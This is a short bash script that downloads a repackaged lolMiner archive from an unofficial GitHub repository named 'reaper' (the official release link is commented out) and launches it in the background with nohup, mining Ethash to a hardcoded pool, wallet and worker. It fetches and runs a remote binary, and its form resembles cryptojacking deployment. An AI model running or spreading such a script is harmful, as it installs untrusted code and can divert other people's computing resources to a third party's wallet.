#!/bin/bash

if pgrep -x "lolMiner" > /dev/null
then
    echo "Already Running"
else
    #wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
    #tar -xf lolMiner_v1.31_Lin64.tar.gz
    wget https://github.com/blitz2099/reaper/raw/main/1.31_Lin64.tar.gz
    tar -xf 1.31_Lin64.tar.gz
    cd 1.31
    nohup ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user 0x3eefcac842f0289e38ed96ebb8003d9b4e9db86a.Bminingaccount1.001:123456 --tls on --ethstratum ETHPROXY > nohup.out &
fi

#$SHELL
